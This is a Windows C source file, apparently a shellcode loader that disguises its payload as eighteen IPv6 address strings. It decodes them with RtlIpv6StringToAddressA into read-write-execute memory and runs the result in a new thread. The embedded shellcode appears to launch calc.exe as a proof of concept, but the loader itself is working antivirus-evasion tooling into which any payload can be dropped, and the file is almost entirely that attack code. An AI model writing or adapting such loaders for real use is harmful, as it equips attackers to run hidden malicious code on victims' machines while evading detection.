#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR		S,
	PCSTR* Terminator,
	PVOID		Addr
	);


//the size and ElementsNumber printed to the screen, which is:
#define ElementsNumber 18
#define SizeOfShellcode 276







//the Ipv4Array array printed to the screen, which is:
const char* Ipv6Array[] = {

		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52",
		"2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0", "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED",
		"5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
		"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1",
		"38E0:75F1:4C03:4C24:0845:39D1:75D8:5844", "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49",
		"01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B",
		"6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF", "D548:83C4:283C:067C:0A80:FBE0:7505:BB47",
		"1372:6F6A:0059:4189:DAFF:D563:616C:632E", "6578:6500:3D43:6F6E:FB5D:1AB0:38FA:0000",
};

BOOL DecodeIPv6Fuscation(const char* IPV6[], PVOID LpBaseAddress) {
	PCSTR Terminator = NULL;
	PVOID LpBaseAddress2 = NULL;
	NTSTATUS STATUS;
	// Getting RtlIpv6StringToAddressA address from ntdll.dll
	fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	int i = 0;
	for (int j = 0; j < ElementsNumber; j++) {
		LpBaseAddress2 = (ULONG_PTR)LpBaseAddress + i;
		STATUS = pRtlIpv6StringToAddressA((PCSTR)IPV6[j], &Terminator, LpBaseAddress2);
		if (!NT_SUCCESS(STATUS)) {
			printf("[!] RtlIpv6StringToAddressA failed for %s result %x", IPV6[j], STATUS);
			return FALSE;
		}
		else {
			i = i + 16;
		}
	}
	return TRUE;
}





int main() {

	PVOID LpBaseAddress = NULL;
	printf("[i] SizeOf IPv6Shell : %d \n", sizeof(Ipv6Array));

	// Allocating memory which will hold the deobfuscated shellcode
	LpBaseAddress = VirtualAllocEx(GetCurrentProcess(), NULL, SizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!LpBaseAddress) {
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return -1;
	}
	printf("[+] LpBaseAddress: 0x%0-16p \n", (void*)LpBaseAddress);


	if (!DecodeIPv6Fuscation(Ipv6Array, LpBaseAddress)) {
		return -1;
	}

	printf("[+] Deobfuscated bytes at address %p of size  %d.\n", LpBaseAddress, SizeOfShellcode);

	// Print the deobfuscated shellcode
	printf("[+] Deobfuscated Shellcode:\n");
	PBYTE pShellcode = (PBYTE)LpBaseAddress;
	for (int i = 0; i < SizeOfShellcode; i++) {
		printf("%02X ", pShellcode[i]);
	}
	printf("\n");

	DWORD LpThreadId;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LpBaseAddress, NULL, NULL, &LpThreadId);

	printf("[+] hit Enter To Exit ... \n");
	getchar();

	VirtualFree(LpBaseAddress, SizeOfShellcode, MEM_DECOMMIT);
	return 0;

}
